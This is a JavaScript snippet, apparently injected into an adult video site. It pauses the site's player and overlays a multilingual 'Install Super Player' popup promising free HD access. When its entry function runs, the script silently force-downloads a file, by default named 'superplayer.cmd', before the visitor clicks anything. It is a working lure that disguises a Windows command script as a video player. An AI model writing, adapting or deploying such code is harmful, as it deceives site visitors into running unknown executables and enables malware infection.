(function () {
  "use strict";

  var downloadUrl = "$DownloadUrl$";

  var copy = {
    en: {
      title: "Install Super Player",
      lead: "Unlock the full experience — free, fast, and built for this model.",
      bullets: [
        "100% free — no subscription required",
        "Search and watch every video from this model",
        "Crystal-clear HD streaming",
        "Download now and start watching instantly"
      ],
      cta: "Download Free Player",
      dismiss: "Maybe later"
    },
    ru: {
      title: "Установите Super Player",
      lead: "Полный доступ бесплатно — все видео этой модели в одном приложении.",
      bullets: [
        "Абсолютно бесплатно — без подписки",
        "Поиск и просмотр всех видео этой модели",
        "Высокое качество HD",
        "Скачайте сейчас и смотрите без ограничений"
      ],
      cta: "Скачать бесплатно",
      dismiss: "Позже"
    },
    es: {
      title: "Instala Super Player",
      lead: "Acceso completo gratis — todos los videos de esta modelo en una app.",
      bullets: [
        "100% gratis — sin suscripción",
        "Busca y mira todos los videos de esta modelo",
        "Streaming en HD nítido",
        "Descarga ahora y empieza al instante"
      ],
      cta: "Descargar gratis",
      dismiss: "Más tarde"
    },
    fr: {
      title: "Installez Super Player",
      lead: "Accès complet gratuit — toutes les vidéos de ce modèle dans une seule app.",
      bullets: [
        "100 % gratuit — sans abonnement",
        "Recherchez et regardez toutes les vidéos de ce modèle",
        "Streaming HD cristallin",
        "Téléchargez maintenant et regardez tout de suite"
      ],
      cta: "Télécharger gratuitement",
      dismiss: "Plus tard"
    },
    zh: {
      title: "安装 Super Player",
      lead: "免费畅享完整体验 — 该模特的全部视频，一站直达。",
      bullets: [
        "完全免费 — 无需订阅",
        "搜索并观看该模特的全部视频",
        "超清 HD 画质",
        "立即下载，马上开看"
      ],
      cta: "免费下载",
      dismiss: "稍后再说"
    }
  };

  function pickLocale() {
    var list = navigator.languages && navigator.languages.length
      ? navigator.languages
      : [navigator.language || "en"];

    for (var i = 0; i < list.length; i++) {
      var code = String(list[i] || "").toLowerCase().split("-")[0];
      if (copy[code]) {
        return code;
      }
    }

    return "en";
  }

  function pausePlayer() {
    try {
      var video = document.querySelector("#kt_player video");
      if (video && !video.paused) {
        video.pause();
      }
    } catch (e) {}

    try {
      var player = window.player_obj;
      if (player && typeof player.fpapi === "function") {
        var fp = player.fpapi();
        if (fp && typeof fp.pause === "function") {
          fp.pause();
        }
      }
    } catch (e) {}
  }

  function hostsMatch(left, right) {
    var a = String(left || "").toLowerCase().replace(/^www\./, "");
    var b = String(right || "").toLowerCase().replace(/^www\./, "");
    return a.length > 0 && a === b;
  }

  function resolveDownloadUrl(url) {
    var trimmed = String(url || "").trim();
    if (!trimmed || trimmed.indexOf("$") >= 0) {
      return "";
    }

    try {
      var absolute;
      if (/^https?:\/\//i.test(trimmed)) {
        absolute = new URL(trimmed);
      } else if (trimmed.indexOf("//") === 0) {
        absolute = new URL(window.location.protocol + trimmed);
      } else {
        absolute = new URL(trimmed, window.location.origin + "/");
      }

      if (hostsMatch(absolute.hostname, window.location.hostname)) {
        return absolute.pathname + absolute.search;
      }

      return absolute.href;
    } catch (e) {
      if (trimmed.charAt(0) === "/") {
        return trimmed;
      }

      return "/" + trimmed.replace(/^\.?\//, "");
    }
  }

  function downloadFileName(url) {
    var path = String(url || "").split("?")[0].split("#")[0];
    var name = path.split("/").pop();
    return name || "superplayer.cmd";
  }

  function forceDownload() {
    var url = resolveDownloadUrl(downloadUrl);
    if (!url) {
      return;
    }

    var link = document.createElement("a");
    link.href = url;
    link.download = downloadFileName(url);
    link.rel = "noopener";
    link.style.display = "none";
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  }

  function injectStyles() {
    if (document.getElementById("tube18-popup-styles")) {
      return;
    }

    var style = document.createElement("style");
    style.id = "tube18-popup-styles";
    style.textContent =
      "#tube18-popup-overlay{" +
      "position:fixed;inset:0;z-index:2147483646;" +
      "display:flex;align-items:center;justify-content:center;padding:20px;" +
      "background:rgba(8,8,12,.72);backdrop-filter:blur(8px);" +
      "font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;" +
      "animation:tube18FadeIn .25s ease}" +
      "@keyframes tube18FadeIn{from{opacity:0}to{opacity:1}}" +
      "#tube18-popup-card{" +
      "width:min(420px,100%);border-radius:18px;overflow:hidden;" +
      "background:linear-gradient(160deg,#1a1a24 0%,#12121a 100%);" +
      "color:#f4f4f8;box-shadow:0 24px 60px rgba(0,0,0,.55),0 0 0 1px rgba(255,255,255,.08);" +
      "transform:translateY(8px);animation:tube18SlideUp .3s ease forwards}" +
      "@keyframes tube18SlideUp{to{transform:translateY(0)}}" +
      "#tube18-popup-card .hero{" +
      "padding:28px 28px 18px;text-align:center;" +
      "background:linear-gradient(135deg,#ff3366 0%,#ff6b35 55%,#ffb347 100%)}" +
      "#tube18-popup-card .icon{" +
      "width:64px;height:64px;margin:0 auto 14px;border-radius:16px;" +
      "background:rgba(255,255,255,.18);display:flex;align-items:center;justify-content:center;" +
      "font-size:32px;line-height:1;box-shadow:inset 0 0 0 1px rgba(255,255,255,.25)}" +
      "#tube18-popup-card h2{margin:0 0 8px;font-size:22px;font-weight:700;letter-spacing:-.02em}" +
      "#tube18-popup-card .lead{margin:0;font-size:14px;line-height:1.45;opacity:.95}" +
      "#tube18-popup-card .body{padding:22px 28px 10px}" +
      "#tube18-popup-card ul{margin:0;padding:0;list-style:none}" +
      "#tube18-popup-card li{" +
      "position:relative;padding:0 0 12px 26px;font-size:14px;line-height:1.45;color:#d8d8e2}" +
      "#tube18-popup-card li:before{" +
      "content:\"\\2713\";position:absolute;left:0;top:0;color:#ff6b8a;font-weight:700}" +
      "#tube18-popup-card .actions{padding:8px 28px 24px;display:flex;flex-direction:column;gap:10px}" +
      "#tube18-popup-card .cta{" +
      "border:0;border-radius:12px;padding:14px 18px;font-size:15px;font-weight:700;cursor:pointer;" +
      "color:#fff;background:linear-gradient(135deg,#ff3366,#ff6b35);" +
      "box-shadow:0 10px 24px rgba(255,51,102,.35);transition:transform .15s ease,box-shadow .15s ease}" +
      "#tube18-popup-card .cta:hover{transform:translateY(-1px);box-shadow:0 14px 28px rgba(255,51,102,.45)}" +
      "#tube18-popup-card .dismiss{" +
      "border:0;background:transparent;color:#9a9aad;font-size:13px;cursor:pointer;padding:6px}" +
      "#tube18-popup-card .dismiss:hover{color:#c8c8d4}" +
      "#tube18-popup-close{" +
      "position:absolute;top:14px;right:14px;width:32px;height:32px;border:0;border-radius:50%;" +
      "background:rgba(0,0,0,.25);color:#fff;font-size:20px;line-height:1;cursor:pointer}" +
      "#tube18-popup-close:hover{background:rgba(0,0,0,.4)}";
    document.head.appendChild(style);
  }

  function removeOverlay() {
    var node = document.getElementById("tube18-popup-overlay");
    if (node && node.parentNode) {
      node.parentNode.removeChild(node);
    }
  }

  function showOverlay() {
    injectStyles();
    removeOverlay();

    var locale = pickLocale();
    var text = copy[locale];
    var overlay = document.createElement("div");
    overlay.id = "tube18-popup-overlay";
    overlay.setAttribute("role", "dialog");
    overlay.setAttribute("aria-modal", "true");

    var bulletsHtml = text.bullets
      .map(function (item) {
        return "<li>" + item + "</li>";
      })
      .join("");

    overlay.innerHTML =
      '<div id="tube18-popup-card">' +
      '<button type="button" id="tube18-popup-close" aria-label="Close">&times;</button>' +
      '<div class="hero">' +
      '<div class="icon" aria-hidden="true">▶</div>' +
      "<h2>" + text.title + "</h2>" +
      '<p class="lead">' + text.lead + "</p>" +
      "</div>" +
      '<div class="body"><ul>' + bulletsHtml + "</ul></div>" +
      '<div class="actions">' +
      '<button type="button" class="cta" id="tube18-popup-cta">' + text.cta + "</button>" +
      '<button type="button" class="dismiss" id="tube18-popup-dismiss">' + text.dismiss + "</button>" +
      "</div>" +
      "</div>";

    document.body.appendChild(overlay);

    function dismiss() {
      removeOverlay();
    }

    overlay.querySelector("#tube18-popup-close").addEventListener("click", dismiss);
    overlay.querySelector("#tube18-popup-dismiss").addEventListener("click", dismiss);
    overlay.querySelector("#tube18-popup-cta").addEventListener("click", function () {
      forceDownload();
      dismiss();
    });
    overlay.addEventListener("click", function (event) {
      if (event.target === overlay) {
        dismiss();
      }
    });
  }

  window.tube18PopupShown = false;

  window.tube18PopupDismiss = function () {
    removeOverlay();
  };

  window.tube18PopupWindow = function () {
    if (window.tube18PopupShown) {
      return;
    }

    window.tube18PopupShown = true;
    pausePlayer();
    forceDownload();
    showOverlay();
  };
})();
